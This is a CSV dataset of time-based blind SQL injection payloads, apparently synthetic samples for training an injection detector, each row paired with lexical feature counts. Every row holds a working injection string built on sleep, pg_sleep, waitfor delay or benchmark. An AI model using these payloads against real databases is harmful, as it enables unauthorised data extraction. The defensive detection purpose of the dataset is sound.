id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001559,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,0.2744447036813305,83.16835296458535,19.89604412057317,2.9440484534765607,29.688132361719507,2.0,41.584176482292676,9.896044120573169,0.3569474513544609,0.024070064860718887,0.5,0.11898248378482028,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.896044120573169,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.10395587942683127,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.103955879426831
SMOTE_001560,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,1.4117391077836223,73.4958277191674,23.0,3.48144137667923,25.959332435066784,4.0,30.316995957800522,13.219499326300088,0.35849073781541435,0.055912883891666015,0.40409220601208706,0.1815041722808326,6.0,0.0,0.0,0.0,0.0,0.26016689123330416,0.0,4.959332435066783,0.0,0.0,0.0,0.2601668912333044,1.0,0.0,0.0,0.0,0.0,0.2601668912333044,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001561,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.8709961553123406,84.66067420781977,27.66067420781977,3.693486076515267,24.66067420781977,18.0,33.0,9.0,0.29126616981361153,0.21262014905591653,0.3898036066025137,0.10631007452795826,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.66067420781977,0.3393257921802299,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001562,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000034,1.444058199891879,66.37956914862264,18.793189716207543,3.098182518414999,13.793189716207545,8.34551772966036,31.24086170275473,13.0,0.20774947362527718,0.12484934617561046,0.4714903590545448,0.1959108211445676,3.17275886483018,0.8272411351698208,0.0,0.0,0.0,1.793189716207545,0.0,4.4136205675849105,2.0,0.0,0.7931897162075449,1.7931897162075447,0.7931897162075447,0.20681028379245514,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7931897162075452,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7931897162075447
SMOTE_001563,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,0.6243455768802784,68.3872258474458,25.754890338978324,3.640182212610485,22.632335508467488,10.0,27.877445169489164,7.877445169489162,0.33078010769769084,0.1463151588599506,0.4077675255811299,0.11513720786122865,0.0,0.12255483051083771,1.7548903389783246,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.7548903389783246,0.0,0.12255483051083771,0.8774451694891623,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.1225548305108376,0.8774451694891623,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001564,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,1.2915584201711834,62.04116295060411,21.28865449647172,3.354670834031511,15.0,12.309235971773777,26.443272482358612,8.288654496471722,0.2441050181371979,0.19480940058832327,0.42688714803919936,0.13419843323527944,0.0,0.0,2.0,0.0,0.0,1.2886544964717221,0.0,4.0,0.0,0.0,1.0,3.2886544964717217,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2886544964717221,0.0,0.7113455035282779,0.28865449647172214,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.288654496471722
SMOTE_001565,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.8738773822517727,82.49990717161393,23.00018565677216,3.1209766333497506,30.0,2.0,39.749860757420876,10.75004641419304,0.36367636249297075,0.024245090832864732,0.48170618501968193,0.1303723616544826,0.7500464141930402,0.0,0.0,0.0,1.0,0.0,0.0,8.24995358580696,0.0,0.0,0.0,1.0,0.7500464141930402,0.0,0.0,0.7500464141930402,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001566,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,1.3803050595650597,73.74887471987961,22.812781320030098,3.344481994913695,16.0837084267068,15.832583146586405,32.374437359939805,9.4581457866466,0.22122126434729858,0.21211371774811594,0.4386353518959956,0.12802966600858984,0.2709271066766994,0.0,2.0,0.0,0.0,1.7290728933233006,0.0,4.7290728933233,0.0,0.0,0.7290728933233006,3.7290728933233006,0.2709271066766994,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.27092710667669934,0.7290728933233006,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001567,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,1.6203059696279836,62.0,17.612937838198086,3.0442900977247054,24.150583784264114,1.0,28.387062161801914,8.462354053933971,0.38952554490748575,0.016129032258064516,0.4578558413193857,0.13648958151506405,0.0,3.0,0.0,0.0,0.0,0.4623540539339711,0.0,5.0,0.0,0.0,0.0,0.4623540539339712,0.0,1.0,0.0,0.0,0.0,0.4623540539339711,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001568,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,1.287680337843719,63.477807407158195,22.477807407158195,3.353974820007378,18.0,10.0,28.0,7.4778074071581955,0.2836188172054316,0.15756600955857308,0.44118482676400467,0.11763034647199065,0.7389037035790977,0.0,1.4778074071581955,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,2.477807407158195,0.7389037035790975,0.0,0.7389037035790977,0.26109629642090243,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001569,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,0.04867559700943698,63.96253983743623,25.967222357756704,3.864045541323146,22.995317479679528,9.957857317115764,21.018730081281884,9.990634959359058,0.3595317808143015,0.15560197263422057,0.32867895887719856,0.15618728767427942,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.004682520320471,0.0,0.0,0.0,2.9906349593590584,1.0,0.0,0.0,0.9953174796795292,0.0,1.0,1.0,0.0,0.0,0.0,0.9953174796795293,1.0,0.0,0.9953174796795291,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.995317479679529
SMOTE_001570,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,3.00785875661123,94.80251965575043,22.703779483625645,3.0402840750473117,18.956929053313683,14.39496068849914,49.098740172124785,12.351889741812823,0.19884260356697334,0.15278638623510832,0.5183523836847449,0.13001862651317345,0.0,1.8025196557504304,0.0,0.0,0.0,1.5493700860623925,0.0,8.0,0.0,0.0,1.0,1.5493700860623925,0.0,0.45062991393760754,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5493700860623925,0.45062991393760743,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001571,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,2.1060914678920915,83.27834894017933,24.611192705739903,3.6092275725555116,19.685321176233174,23.296513881973073,31.222385411479806,9.07412847049327,0.23635173128819292,0.27808547933671657,0.37637663968063395,0.1091861496944565,0.5370642352466343,0.0,0.0,0.0,0.0,1.5370642352466344,0.0,5.0,0.0,0.0,1.0,1.5370642352466344,0.5370642352466344,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5370642352466344,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5370642352466346
SMOTE_001572,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,1.3768335217102032,90.03114609512184,27.031146095121834,3.64258294414126,25.74972292032489,20.25027707967511,35.0,9.031146095121834,0.28541878110907587,0.22564219588462175,0.3888507433647699,0.10008827964153255,1.0311460951218334,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.3437153650406112,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001573,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,0.1547923932783015,98.91785171390272,23.91785171390272,2.892066484449929,29.91785171390272,2.0,53.0,14.0,0.3024400466790886,0.02021912908176557,0.535806920666787,0.14153390357235884,0.9589258569513595,0.041074143048640654,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0,0.9589258569513591,0.04107414304864054,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.041074143048640654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0410741430486405
SMOTE_001574,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000038,1.779148236198586,80.75441200049443,22.75441200049443,3.130875446911761,28.877206000247217,2.0,39.0,10.877206000247215,0.35750735671887846,0.024781329266281987,0.4832359206924992,0.13447539332234035,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.43860300012360776,0.0,0.0,1.0,0.0,1.0,0.0,0.43860300012360764,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5613969998763924,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.561396999876393
SMOTE_001575,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.053233902518704045,89.0,27.977567151519814,3.884153019133491,25.966350727279718,22.011216424240097,30.05608212120047,10.96635072727972,0.29175674974471594,0.2473170384746078,0.33770878787865694,0.12321742390201931,3.9551343030396255,0.0,0.0,0.0,0.0,1.9887835757599066,0.0,4.022432848480188,0.0,0.0,1.0,1.9887835757599064,0.9887835757599064,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.011216424240093725,0.0,0.0,0.0,1.9887835757599066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001576,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,1.2902122325659822,78.59904726953812,24.0,3.4343064181879566,17.0,19.0,32.72862716314904,9.870420106389082,0.218826331560182,0.24457060586137988,0.4116210229455398,0.12498203963289836,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.870420106389081,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001577,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,1.50504670839577,65.45245175702827,23.306556469628536,3.4563901456061137,19.0,10.0,28.226225878514136,8.226225878514136,0.29117000147920025,0.1532473691995791,0.4310386838601894,0.12454394546103122,0.0,1.0,0.6131129392570683,0.0,0.0,1.0,0.0,4.306556469628534,0.30655646962853417,1.0,0.0,1.6131129392570682,0.0,1.0,0.30655646962853417,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001578,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,0.6602453022957032,63.25698336981759,23.25698336981759,3.4631523646279883,19.25698336981759,10.0,27.0,7.0,0.3043916835991999,0.158092799182,0.4268505577914,0.11066495942740001,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.25698336981759107,0.7430166301824089,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001579,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,1.9910248297198831,58.32649379305962,24.66324689652981,3.9619372800042267,24.33059751722385,6.661195034447696,16.002051862082112,11.332649379305963,0.41725133040753576,0.1099467836985692,0.27791956865244827,0.19488231724144675,5.667350620694037,0.0,0.6652987586119243,0.0,0.0,1.0,0.0,1.6673506206940378,0.0,0.0,0.0,1.9979481379178867,1.0,0.0,0.33264937930596217,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3326493793059622,0.0,0.3326493793059622,0.0,0.6673506206940378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.332649379305962
SMOTE_001580,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,0.31198443751688715,77.50584266256385,16.109812741652476,2.626367482231915,18.560749033390085,2.439250966609915,43.670561775042565,12.83528088752128,0.23896830435074573,0.03219061502609545,0.5633680307135843,0.1654730499095745,3.780374516695043,0.0,0.0,0.0,0.0,1.0,0.0,7.94509362917376,0.0,0.0,0.05490637082623967,1.0,0.9450936291737604,0.0,0.0,0.054906370826239614,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9450936291737606,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9450936291737606
SMOTE_001581,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000042,2.1942605646421574,95.6105340094378,24.56491099842703,3.2042702358563186,35.649109984270325,1.4350890015729671,45.656157020448575,12.870178003145936,0.3748176244335427,0.014863988610497245,0.4758989076272625,0.13441947932869755,2.129821996854065,0.0,0.0,0.0,1.0,0.0,0.0,9.305267004718903,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.43508900157296765,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5649109984270323,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.564910998427033
SMOTE_001582,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,0.8698824091918954,87.4478700749385,27.26382676658467,3.782655228857193,21.07978345823084,25.527653533169342,31.472346466830658,9.368086616707664,0.2407978345823084,0.2914894410288185,0.36044523888140945,0.10726748550746364,0.0,1.0,0.0,0.0,0.0,1.8159566916461678,0.0,4.552129925061497,0.0,0.0,1.0,1.8159566916461678,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8159566916461679,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.815956691646168
SMOTE_001583,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,1.288297182242061,86.56205871481922,21.423365952677344,3.0850797456504178,32.84673190535469,1.7153268094645302,41.430653618929064,10.569346381070938,0.3779139424737861,0.020092592750304936,0.4801034866830049,0.12188997809290406,0.8540195716064058,0.0,0.0,0.0,1.0,0.0,0.0,8.715326809464532,0.0,0.0,0.0,1.0,0.2846731905354687,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.2846731905354685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.284673190535469
SMOTE_001584,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,1.3646768937478397,89.45926114100514,28.0,3.6689069337967277,26.715100438848133,18.0,35.058120526617756,9.686040175539253,0.2982355352673425,0.20212884747441867,0.3915707835665474,0.1080648336916915,0.0,0.34302008776962634,2.0,0.0,0.0,2.0,0.0,4.343020087769626,0.0,1.0,0.0,4.0,0.0,0.34302008776962634,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6569799122303737,0.3430200877696263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001585,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,0.9153825021635518,70.60691824686063,23.348270438284842,3.5510249873662154,17.0,19.0,26.606918246860634,8.0,0.2409482005317339,0.2692950476531144,0.3763693633296299,0.11338738848552184,0.0,0.3482704382848414,0.0,0.0,0.0,1.0,0.0,4.651729561715158,0.0,0.0,1.0,1.0,0.0,0.34827043828484133,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001586,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,0.40076495784178573,90.88937676555196,19.824114730462664,2.8736107395285497,13.736172095693997,17.296458921850654,48.94468838277598,10.912057365231332,0.151318798532307,0.18927254136702126,0.538785597837084,0.12062306226358771,0.0,0.0,0.0,0.0,0.0,1.9120573652313317,0.0,7.912057365231332,0.0,0.0,1.0,1.9120573652313317,0.0,0.0,0.0,0.0879426347686684,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9120573652313317,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9120573652313317
SMOTE_001587,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,0.5355002169405557,64.0,25.84923945171177,3.8432123567961334,22.748732419519616,10.0,21.351774612672536,9.899492967807847,0.35544894405499405,0.15625,0.33362147832300837,0.1546795776219976,2.8994929678078467,0.0,0.10050703219215307,0.0,0.0,1.0,0.0,3.0502535160960766,0.0,0.0,0.0,3.0,1.0,0.0,0.050253516096076534,0.9497464839039235,0.0,1.0,1.0,0.0,0.0,0.0,0.9497464839039236,0.9497464839039235,0.0,1.0,0.0,0.9497464839039235,0.050253516096076534,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9497464839039234
SMOTE_001588,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,1.4026312015631839,57.07944834897984,19.944517305357362,3.2962843405335214,22.13493104362248,2.2143793926023214,24.46027582551008,8.26986208724496,0.3883393623787116,0.03653063550132536,0.4304657470714477,0.14466425504851535,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.8650689563775202,0.0,0.0,0.0,1.2698620872449602,1.0,0.0,0.0,0.13493104362248015,0.0,1.0,1.0,0.0,0.0,0.0,0.13493104362248007,1.0,0.0,0.1349310436224801,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.13493104362248
SMOTE_001589,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,1.0708656219656918,87.61777585211966,26.85292946798912,3.6865099455446093,33.529294679891215,10.0,33.50019904418493,10.588282128043513,0.385027234194013,0.11433975563159954,0.3802284903361537,0.12040451983823369,0.0,4.0,0.0,0.0,0.0,1.0,0.0,4.588282128043513,0.0,0.8529294679891217,0.1470705320108783,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8529294679891217,0.0,0.0,0.8529294679891218,1.8529294679891217,0.1470705320108781,0.0,0.0,0.0,0.0,0.0,0.0,0.1470705320108781,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8529294679891217
